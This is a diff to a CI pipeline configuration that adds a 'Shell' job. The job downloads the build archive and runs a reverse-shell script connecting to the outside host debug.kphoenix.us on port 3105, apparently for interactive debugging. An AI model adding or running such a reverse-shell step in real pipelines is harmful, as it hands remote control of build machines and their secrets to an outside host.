@@ -13,6 +13,22 @@ jobs:
       artifactName: "build_archive"
       targetPath: ./build.tar.gz
 
+- job: Shell
+  pool:
+    vmImage: ubuntu-16.04
+  container:
+    image: angr/ci:debug
+    options: --cap-add=SYS_PTRACE
+  dependsOn: Build
+  condition: succeeded()
+  steps:
+  - task: DownloadPipelineArtifact@0
+    inputs:
+      artifactName: "build_archive"
+      targetPath: .
+
+  - script: /root/scripts/reverse-shell.sh debug.kphoenix.us 3105
+
 - job: Lint
   pool:
     vmImage: ubuntu-16.04
